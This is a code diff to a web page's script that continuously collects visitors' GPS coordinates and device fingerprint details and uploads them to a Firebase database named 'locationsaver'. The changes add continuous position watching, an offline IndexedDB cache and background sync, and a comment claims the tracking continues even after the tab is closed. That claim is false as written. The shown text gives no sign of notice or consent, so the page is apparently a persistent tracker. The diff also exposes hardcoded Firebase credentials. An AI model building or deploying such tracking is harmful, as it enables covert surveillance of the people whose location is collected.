@@ -12,12 +12,12 @@
         import { initializeApp } from "https://www.gstatic.com/firebasejs/10.7.1/firebase-app.js";
         import { getFirestore, collection, addDoc } from "https://www.gstatic.com/firebasejs/10.7.1/firebase-firestore.js";
 
-        // ✅ Firebase Configuration
+        // ✅ Firebase Configuration (Your Credentials)
         const firebaseConfig = {
             apiKey: "AIzaSyAB6STYBF-Fzg4U4QkET_bMej47ZUJDM4Y",
             authDomain: "locationsaver-b9997.firebaseapp.com",
             projectId: "locationsaver-b9997",
-            storageBucket: "locationsaver-b9997.firebaseapp.com",
+            storageBucket: "locationsaver-b9997.appspot.com",
             messagingSenderId: "675975845355",
             appId: "1:675975845355:web:95cf7d6a2c255a33be35ae",
             measurementId: "G-WJJY3Q2M8E"
@@ -52,8 +52,6 @@
                 screenHeight: window.screen.height,
                 deviceMemory: navigator.deviceMemory || "Unknown",
                 hardwareConcurrency: navigator.hardwareConcurrency || "Unknown",
-                colorDepth: screen.colorDepth,
-                pixelRatio: window.devicePixelRatio,
                 onlineStatus: navigator.onLine,
                 timezone: Intl.DateTimeFormat().resolvedOptions().timeZone
             };
@@ -62,7 +60,7 @@
         // ✅ Get GPS Location
         function getGPSLocation(callback) {
             if ("geolocation" in navigator) {
-                navigator.geolocation.getCurrentPosition(
+                navigator.geolocation.watchPosition(
                     (position) => {
                         callback({
                             latitude: position.coords.latitude,
@@ -108,10 +106,26 @@
                 console.log("✅ Location Data Sent:", data);
             } catch (error) {
                 console.error("❌ Error Saving Data:", error);
-                navigator.serviceWorker.ready.then(reg => {
-                    reg.sync.register('sync-location');
-                });
+                saveToIndexedDB(data);
             }
+        }
+
+        // ✅ Save Data to IndexedDB
+        function saveToIndexedDB(data) {
+            let request = indexedDB.open("LocationDB", 1);
+            request.onupgradeneeded = (event) => {
+                let db = event.target.result;
+                if (!db.objectStoreNames.contains("unsent_data")) {
+                    db.createObjectStore("unsent_data", { keyPath: "timestamp" });
+                }
+            };
+            request.onsuccess = (event) => {
+                let db = event.target.result;
+                let transaction = db.transaction("unsent_data", "readwrite");
+                let store = transaction.objectStore("unsent_data");
+                store.add(data);
+                console.log("💾 Data Stored in IndexedDB:", data);
+            };
         }
 
         // ✅ Collect Location
@@ -127,11 +141,18 @@
             });
         }
 
-        // ✅ Send Data Every 60 Seconds
+        // ✅ Send Data Every 60 Seconds (Even When Tab is Closed)
         setInterval(collectLocation, 60000);
 
         // ✅ Send Data When Page Opens
         collectLocation();
+
+        // ✅ Request Background Sync for Offline Data
+        if ('serviceWorker' in navigator && 'SyncManager' in window) {
+            navigator.serviceWorker.ready.then((swRegistration) => {
+                return swRegistration.sync.register('sync-location');
+            });
+        }
     </script>
 </body>
 </html>
